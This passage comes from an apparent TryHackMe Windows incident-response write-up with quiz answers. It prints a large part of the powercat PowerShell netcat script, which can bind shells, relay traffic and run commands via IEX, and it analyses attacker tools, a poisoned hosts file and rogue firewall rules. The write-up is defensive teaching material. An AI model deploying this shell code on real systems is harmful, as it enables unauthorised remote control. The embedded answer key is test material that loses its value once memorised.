    $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["StreamBytesRead"] = 1
    return $FuncVars
  }
  function ReadData_TCP
  {
    param($FuncVars)
    $Data = $null
    if($FuncVars["StreamBytesRead"] -eq 0){break}
    if($FuncVars["StreamReadOperation"].IsCompleted)
    {
      $StreamBytesRead = $FuncVars["Stream"].EndRead($FuncVars["StreamReadOperation"])
      if($StreamBytesRead -eq 0){break}
      $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
      $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_TCP
  {
    param($Data,$FuncVars)
    $FuncVars["Stream"].Write($Data, 0, $Data.Length)
    return $FuncVars
  }
  function Close_TCP
  {
    param($FuncVars)
    try{$FuncVars["Stream"].Close()}
    catch{}
    if($FuncVars["l"]){$FuncVars["Socket"].Stop()}
    else{$FuncVars["Socket"].Close()}
  }
  ########## TCP FUNCTIONS ##########
  
  ########## CMD FUNCTIONS ##########
  function Setup_CMD
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    $FuncVars = @{}
    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessStartInfo.FileName = $FuncSetupVars[0]
    $ProcessStartInfo.UseShellExecute = $False
    $ProcessStartInfo.RedirectStandardInput = $True
    $ProcessStartInfo.RedirectStandardOutput = $True
    $ProcessStartInfo.RedirectStandardError = $True
    $FuncVars["Process"] = [System.Diagnostics.Process]::Start($ProcessStartInfo)
    Write-Verbose ("Starting Process " + $FuncSetupVars[0] + "...")
    $FuncVars["Process"].Start() | Out-Null
    $FuncVars["StdOutDestinationBuffer"] = New-Object System.Byte[] 65536
    $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
    $FuncVars["StdErrDestinationBuffer"] = New-Object System.Byte[] 65536
    $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    return $FuncVars
  }
  function ReadData_CMD
  {
    param($FuncVars)
    [byte[]]$Data = @()
    if($FuncVars["StdOutReadOperation"].IsCompleted)
    {
      $StdOutBytesRead = $FuncVars["Process"].StandardOutput.BaseStream.EndRead($FuncVars["StdOutReadOperation"])
      if($StdOutBytesRead -eq 0){break}
      $Data += $FuncVars["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)]
      $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
    }
    if($FuncVars["StdErrReadOperation"].IsCompleted)
    {
      $StdErrBytesRead = $FuncVars["Process"].StandardError.BaseStream.EndRead($FuncVars["StdErrReadOperation"])
      if($StdErrBytesRead -eq 0){break}
      $Data += $FuncVars["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)]
      $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_CMD
  {
    param($Data,$FuncVars)
    $FuncVars["Process"].StandardInput.WriteLine($FuncVars["Encoding"].GetString($Data).TrimEnd("`r").TrimEnd("`n"))
    return $FuncVars
  }
  function Close_CMD
  {
    param($FuncVars)
    $FuncVars["Process"] | Stop-Process
  }  
  ########## CMD FUNCTIONS ##########
  
  ########## POWERSHELL FUNCTIONS ##########
  function Main_Powershell
  {
    param($Stream1SetupVars)   
    try
    {
      $encoding = New-Object System.Text.AsciiEncoding
      [byte[]]$InputToWrite = @()
      if($i -ne $null)
      {
        Write-Verbose "Input from -i detected..."
        if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
        elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
        else{Write-Host "Unrecognised input type." ; return}
      }
    
      Write-Verbose "Setting up Stream 1... (ESC/CTRL to exit)"
      try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
      catch{Write-Verbose "Stream 1 Setup Failure" ; return}
      
      Write-Verbose "Setting up Stream 2... (ESC/CTRL to exit)"
      try
      {
        $IntroPrompt = $Encoding.GetBytes("Windows PowerShell`nCopyright (C) 2013 Microsoft Corporation. All rights reserved.`n`n" + ("PS " + (pwd).Path + "> "))
        $Prompt = ("PS " + (pwd).Path + "> ")
        $CommandToExecute = ""      
        $Data = $null
      }
      catch
      {
        Write-Verbose "Stream 2 Setup Failure" ; return
      }
      
      if($InputToWrite -ne @())
      {
        Write-Verbose "Writing input to Stream 1..."
        try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
        catch{Write-Host "Failed to write input to Stream 1" ; return}
      }
      
      if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
      
      Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
      while($True)
      {        
        try
        {
          ##### Stream2 Read #####
          $Prompt = $null
          $ReturnedData = $null
          if($CommandToExecute -ne "")
          {
            try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}
            catch{[byte[]]$ReturnedData = $Encoding.GetBytes(($_ | Out-String))}
            $Prompt = $Encoding.GetBytes(("PS " + (pwd).Path + "> "))
          }
          $Data += $IntroPrompt
          $IntroPrompt = $null
          $Data += $ReturnedData
          $Data += $Prompt
          $CommandToExecute = ""
          ##### Stream2 Read #####

          if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
        }
        
        try
        {
          $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
          if($Data.Length -eq 0){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$CommandToExecute = $Encoding.GetString($Data)}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
        }
      }
    }
    finally
    {
      try
      {
        Write-Verbose "Closing Stream 1..."
        Stream1_Close $Stream1Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 1"
      }
    }
  }
  ########## POWERSHELL FUNCTIONS ##########

  ########## CONSOLE FUNCTIONS ##########
  function Setup_Console
  {
    param($FuncSetupVars)
    $FuncVars = @{}
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["Output"] = $FuncSetupVars[0]
    $FuncVars["OutputBytes"] = [byte[]]@()
    $FuncVars["OutputString"] = ""
    return $FuncVars
  }
  function ReadData_Console
  {
    param($FuncVars)
    $Data = $null
    if($Host.UI.RawUI.KeyAvailable)
    {
      $Data = $FuncVars["Encoding"].GetBytes((Read-Host) + "`n")
    }
    return $Data,$FuncVars
  }
  function WriteData_Console
  {
    param($Data,$FuncVars)
    switch($FuncVars["Output"])
    {
      "Host" {Write-Host -n $FuncVars["Encoding"].GetString($Data)}
      "String" {$FuncVars["OutputString"] += $FuncVars["Encoding"].GetString($Data)}
      "Bytes" {$FuncVars["OutputBytes"] += $Data}
    }
    return $FuncVars
  }
  function Close_Console
  {
    param($FuncVars)
    if($FuncVars["OutputString"] -ne ""){return $FuncVars["OutputString"]}
    elseif($FuncVars["OutputBytes"] -ne @()){return $FuncVars["OutputBytes"]}
    return
  }
  ########## CONSOLE FUNCTIONS ##########
  
  ########## MAIN FUNCTION ##########
  function Main
  {
    param($Stream1SetupVars,$Stream2SetupVars)
    try
    {
      [byte[]]$InputToWrite = @()
      $Encoding = New-Object System.Text.AsciiEncoding
      if($i -ne $null)
      {
        Write-Verbose "Input from -i detected..."
        if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
        elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
        else{Write-Host "Unrecognised input type." ; return}
      }
      
      Write-Verbose "Setting up Stream 1..."
      try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
      catch{Write-Verbose "Stream 1 Setup Failure" ; return}
      
      Write-Verbose "Setting up Stream 2..."
      try{$Stream2Vars = Stream2_Setup $Stream2SetupVars}
      catch{Write-Verbose "Stream 2 Setup Failure" ; return}
      
      $Data = $null
      
      if($InputToWrite -ne @())
      {
        Write-Verbose "Writing input to Stream 1..."
        try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
        catch{Write-Host "Failed to write input to Stream 1" ; return}
      }
      
      if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
      
      Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
      while($True)
      {
        try
        {
          $Data,$Stream2Vars = Stream2_ReadData $Stream2Vars
          if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
        }
        
        try
        {
          $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
          if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$Stream2Vars = Stream2_WriteData $Data $Stream2Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
        }
      }
    }
    finally
    {
      try
      {
        #Write-Verbose "Closing Stream 2..."
        Stream2_Close $Stream2Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 2"
      }
      try
      {
        #Write-Verbose "Closing Stream 1..."
        Stream1_Close $Stream1Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 1"
      }
    }
  }
  ########## MAIN FUNCTION ##########
  
  ########## GENERATE PAYLOAD ##########
  if($u)
  {
    Write-Verbose "Set Stream 1: UDP"
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
    if($l){$InvokeString = "Main @('',`$True,'$p','$t') "}
    else{$InvokeString = "Main @('$c',`$False,'$p','$t') "}
  }
  elseif($dns -ne "")
  {
    Write-Verbose "Set Stream 1: DNS"
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
    if($l){return "This feature is not available."}
    else{$InvokeString = "Main @('$c','$p','$dns',$dnsft) "}
  }
  else
  {
    Write-Verbose "Set Stream 1: TCP"
    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
    if($l){$InvokeString = "Main @('',`$True,$p,$t) "}
    else{$InvokeString = "Main @('$c',`$False,$p,$t) "}
  }
  
  if($e -ne "")
  {
    Write-Verbose "Set Stream 2: Process"
    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_CMD} + "`n}`n`n")
    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_CMD} + "`n}`n`n")
    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_CMD} + "`n}`n`n")
    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_CMD} + "`n}`n`n")
    $InvokeString += "@('$e')`n`n"
  }
  elseif($ep)
  {
    Write-Verbose "Set Stream 2: Powershell"
    $InvokeString += "`n`n"
  }
  elseif($r -ne "")
  {
    if($r.split(":")[0].ToLower() -eq "udp")
    {
      Write-Verbose "Set Stream 2: UDP"
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
      else{return "Bad relay format."}
    }
    if($r.split(":")[0].ToLower() -eq "dns")
    {
      Write-Verbose "Set Stream 2: DNS"
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
      if($r.split(":").Count -eq 2){return "This feature is not available."}
      elseif($r.split(":").Count -eq 4){$InvokeString += ("@('" + $r.split(":")[1] + "','" + $r.split(":")[2] + "','" + $r.split(":")[3] + "',$dnsft) ")}
      else{return "Bad relay format."}
    }
    elseif($r.split(":")[0].ToLower() -eq "tcp")
    {
      Write-Verbose "Set Stream 2: TCP"
      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
      else{return "Bad relay format."}
    }
  }
  else
  {
    Write-Verbose "Set Stream 2: Console"
    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_Console} + "`n}`n`n")
    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_Console} + "`n}`n`n")
    $InvokeString += ("@('" + $o + "')")
  }
  
  if($ep){$FunctionString += ("function Main`n{`n" + ${function:Main_Powershell} + "`n}`n`n")}
  else{$FunctionString += ("function Main`n{`n" + ${function:Main} + "`n}`n`n")}
  $InvokeString = ($FunctionString + $InvokeString)
  ########## GENERATE PAYLOAD ##########
  
  ########## RETURN GENERATED PAYLOADS ##########
  if($ge){Write-Verbose "Returning Encoded Payload..." ; return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
  elseif($g){Write-Verbose "Returning Payload..." ; return $InvokeString}
  ########## RETURN GENERATED PAYLOADS ##########
  
  ########## EXECUTION ##########
  $Output = $null
  try
  {
    if($rep)
    {
      while($True)
      {
        $Output += IEX $InvokeString
        Start-Sleep -s 2
        Write-Verbose "Repetition Enabled: Restarting..."
      }
    }
    else
    {
      $Output += IEX $InvokeString
    }
  }
  finally
  {
    if($Output -ne $null)
    {
      if($of -eq ""){$Output}
      else{[io.file]::WriteAllBytes($of,$Output)}
    }
  }
  ########## EXECUTION ##########
}
```

**Key findings:**

- The malicious scheduled task is **`Clean file system`**, triggering **daily at 4:55 PM**.
- It executes **`C:\TMP\nc.ps1`**, which is **powercat**, a PowerShell reimplementation of netcat, not a filesystem cleanup utility.
- The arguments `-l 1348` resolve against powercat's own parameter block: `-l` aliases to `Listen` (a switch enabling listen mode), and `1348` binds positionally to `-p` / `Port` via `[Parameter(Position=-1)]`. The task therefore **opens a listener on TCP port 1348**.
- This is a **bind shell**. The victim opens a port and waits for inbound connection which complements the PsExec autostart from 2.1 that dials **outward** to `10.34.2.3`. Two channels in opposing directions provide redundant access if either is disrupted.
- `C:\TMP` now holds at least two attacker artifacts (`p.exe`, `nc.ps1`) and requires full enumeration.

###### Bind shells versus reverse shells

A shell gives an attacker command execution on a target. The distinction is which side initiates the connection.

A **bind shell** has the victim open a listening port and wait. The attacker connects inward. This is simple, but it requires the port to be reachable, which usually means a firewall rule permitting inbound traffic — a rule that becomes evidence.

A **reverse shell** has the victim connect outward to the attacker. This usually succeeds where a bind shell fails, because outbound traffic is typically far less restricted than inbound.

This host runs both: `nc.ps1 -l 1348` binds, while `p.exe` dials out to `10.34.2.3`. Redundancy of this kind is deliberate — closing one channel does not evict the attacker.

###### Theory: Why `.ps1` opens in Notepad

A `.ps1` file is a PowerShell script — plain text containing commands. Unlike `.exe`, it is not directly executable. Windows deliberately associates `.ps1` with Notepad so that double-clicking a script edits it rather than runs it, which prevents a user from executing a downloaded script by accident. Running one requires explicitly invoking the interpreter (`powershell.exe -File script.ps1`) or dot-sourcing it in a session. This safety default is why manually triggering the task displayed the payload instead of executing it.

**Next:** Three further tasks remain uninspected, and one of them relates to credential theft. Before that, establish whether the second privileged account left any logon trace.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q7 What file was the task trying to run daily?

==nc.ps1==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q8 What port did this file listen locally for?

==1348==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q9 When did Jenny last logon?

==Never==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q10 At what date did the compromise take place?

==03/02/2019==
<div align="center">
<br>
<br>
</div>

**GUI:**

```
Explorer → This PC → Local Disk (C:) → TMP
```

![[Pasted image 20260826161517.png]]

![[Pasted image 20260826161543.png]]

**Result — C:\ root:**

|Name|Date modified|Analysis|Simple Explanation|
|---|---|---|---|
|badr|8/26/2026 10:27 AM|Lab agent|TryHackMe's own tooling|
|inetpub|**3/2/2019 4:41 PM**|IIS web root, modified in compromise window|The web server's files were touched during the attack|
|PerfLogs|2/23/2018 11:06 AM|Windows baseline|Standard, untouched|
|Program Files|11/15/2025 3:53 PM|Windows baseline|Standard|
|Program Files (x86)|1/29/2021 11:46 AM|Windows baseline|Standard|
|**TMP**|**3/2/2019 4:55 PM**|**Non-standard directory**|Windows never creates `C:\TMP`|
|Users|3/2/2019 4:09 PM|Profile activity in window|User profiles changed that afternoon|
|Windows|11/15/2025 3:53 PM|Windows baseline|Standard|

**Result — C:\TMP (15 items):**

|Name|Date modified|Type|Size|Analysis|Simple Explanation|
|---|---|---|---|---|---|
|d.txt|3/2/2019 4:37 PM|Text|10 KB|Output/notes|Some captured text|
|mim.exe|3/2/2019 4:37 PM|Application|648 KB|Credential-dumping candidate|Suspicious program|
|mim-out.txt|3/2/2019 4:37 PM|Text|4 KB|Paired output of `mim.exe`|Results from that program|
|moutput.tmp|3/2/2019 4:45 PM|TMP|173 KB|Generated post-drop|Produced during the attack|
|nbtscan.exe|3/2/2019 4:37 PM|Application|36 KB|NetBIOS network scanner|Maps other machines on the network|
|nc.ps1|3/2/2019 4:37 PM|PowerShell|37 KB|powercat (confirmed 2.4)|The bind-shell script|
|p.exe|3/2/2019 4:37 PM|Application|373 KB|PsExec (confirmed 2.1)|Remote-execution tool|
|scan1.tmp|3/2/2019 4:46 PM|TMP|0 KB|Empty scan output|Scan produced nothing|
|scan2.tmp|3/2/2019 4:46 PM|TMP|0 KB|Empty scan output|Scan produced nothing|
|scan3.tmp|3/2/2019 4:46 PM|TMP|0 KB|Empty scan output|Scan produced nothing|
|schtasks-backdoor.ps1|3/2/2019 4:37 PM|PowerShell|7 KB|Scheduled-task persistence tooling|Script for creating backdoor tasks|
|somethingwindows.dmp|3/2/2019 4:45 PM|DMP|**39,517 KB**|Large memory dump|A ~39 MB copy of process memory|
|sys.txt|3/2/2019 4:46 PM|Text|12 KB|System enumeration output|Notes about the machine|
|WMIBackdoor.ps1|3/2/2019 4:37 PM|PowerShell|20 KB|WMI persistence tooling|Another persistence method|
|xCmd.exe|3/2/2019 4:37 PM|Application|824 KB|PsExec-style remote execution|Another remote-command tool|

**What this gives you:** **Key findings:**

- **The compromise took place on 03/02/2019** (2 March 2019, US format).
- `C:\TMP` is **not a standard Windows directory**. The Windows baseline at root is `PerfLogs`, `Program Files`, `Program Files (x86)`, `Users`, and `Windows`; temporary files belong in `C:\Windows\Temp` or per-user `%TEMP%`. `C:\TMP` follows Unix convention and was created by the attacker.
- Timestamps resolve into a **three-stage sequence**, not a single event: at **4:37 PM** nine tools are staged simultaneously; at **4:45 PM** a 39 MB `.dmp` and a 173 KB `.tmp` are produced; at **4:46 PM** three zero-byte scan files and `sys.txt` appear.
- The three `scan*.tmp` files are **0 KB — a dead end for the attacker**, indicating scans that returned no results. Their presence still evidences reconnaissance activity.
- Earliest artifact time is **4:37 PM**, moving the timeline start earlier than Jenny's 4:52 PM password change and the 4:55 PM TMP folder stamp.
- `inetpub` modified at **4:41 PM** places IIS web-root activity inside the same window.
- The toolkit spans four attacker functions: remote execution (`p.exe`, `xCmd.exe`), reconnaissance (`nbtscan.exe`), persistence (`nc.ps1`, `schtasks-backdoor.ps1`, `WMIBackdoor.ps1`), and credential access (`mim.exe`, `somethingwindows.dmp`).
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q11 During the compromise, at what time did Windows first assign special privileges to a new logon?

==03/02/2019 4:04:49 PM==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q12 What tool was used to get Windows passwords?

==Mimikatz==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q13 What was the attackers external control and command servers IP?

==76.32.97.132==
<div align="center">
<br>
<br>
</div>
Open `C:\Windows\System32\drivers\etc\hosts`:

**Result:**

![[Pasted image 20260826165016.png]]

```
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
10.2.2.2	update.microsoft.com 
127.0.0.1  www.virustotal.com 
127.0.0.1  www.www.com 
127.0.0.1  dci.sophosupd.com 
10.2.2.2	update.microsoft.com 
127.0.0.1  www.virustotal.com 
127.0.0.1  www.www.com 
127.0.0.1  dci.sophosupd.com 
10.2.2.2	update.microsoft.com 
127.0.0.1  www.virustotal.com 
127.0.0.1  www.www.com 
127.0.0.1  dci.sophosupd.com 
76.32.97.132 google.com
76.32.97.132 www.google.com
```

**`76.32.97.132`** is your answer: mapped to both `google.com` and `www.google.com`. Unlike `10.34.2.3`, that's routable public space, which is what "external" requires.

Look at the other entries, because they're a different tactic. `www.virustotal.com`, `www.www.com`, and `dci.sophosupd.com` all point at `127.0.0.1` — the loopback address, meaning the host itself. Any attempt to reach those names goes nowhere. That's **defence sabotage**: VirusTotal is where a defender uploads a suspicious file for analysis, and `dci.sophosupd.com` is the Sophos antivirus update channel. Blackholing them blinds the security tooling and the investigator simultaneously, without triggering anything that looks like an attack.

`update.microsoft.com` → `10.2.2.2` is the third pattern. Not blackholed, redirected — to an internal address in the same private ranges as the PsExec target. Windows Update traffic gets steered to a machine the attacker controls, which is a route for delivering malicious "updates."

Note the whole block appears **three times** over. That's the fingerprint of a script that appends rather than checks — run three times, three identical blocks. Sloppy, and it tells you the modification was automated. The final Google lines appear only once, suggesting they were added separately.

File timestamp is `3/2/2019 5:31 PM`, which slots into your timeline between the TMP staging (4:37–4:46) and John's logon (5:48).

###### Theory: The hosts file and DNS override

Before a Windows machine asks a DNS server to resolve a hostname, it checks `C:\Windows\System32\drivers\etc\hosts`. Any entry found there wins — no DNS query is sent at all.

The format is one mapping per line: an IP address, whitespace, then one or more hostnames. Lines starting with `#` are comments. A clean Server 2016 hosts file contains **only** comments; even the `localhost` examples are commented out, because that resolution is handled internally. Any uncommented line is therefore a deliberate modification worth explaining.

Attackers use it three ways, all visible in this file. **Blackholing** points a hostname at `127.0.0.1` so traffic loops back and fails — used to sever antivirus updates and analysis sites. **Redirection** points a hostname at a machine the attacker controls, so software fetching updates receives attacker-supplied content. **Masquerading** points a well-known trusted name at attacker infrastructure, so beacon traffic appears in logs as connections to a reputable destination.

Editing the file requires administrative rights, so its modification is itself evidence of elevated access. It also survives reboots, needs no running process, and is trivially missed by anyone looking only at live connections.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q14 What was the extension name of the shell uploaded via the servers website?

==.jsp==

![[Pasted image 20260826165708.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q15 What was the last port the attacker opened?

==1337==
<div align="center">
<br>
<br>
</div>

**GUI:**

```
Win+R  →  wf.msc  →  Inbound Rules
```

**Result (top of Inbound Rules):**

![[Pasted image 20260826165928.png]]

**Key findings:**

- The last port opened by the attacker is **1337**, via the inbound rule **`Allow outside connections for development`**.
- The rule is identifiable as hand-created by three characteristics: an **empty Group field** (every legitimate rule below is bound to a Windows feature group), a **prose name reading as a justification** rather than a product identifier, and a **`Program: Any` + `Remote Address: Any`** combination that permits any binary to accept connections from any source — a configuration no legitimate application rule uses.
- **1337** is leetspeak for "leet" and carries no assigned service. Its selection is a convention among attackers, not a functional requirement.
- **`Service Firewall` on TCP 8888** shares the blank Group and Public profile and is also suspicious, though outside the scope of this question.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Q16 Check for DNS poisoning, what site was targeted?

==google.com==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References
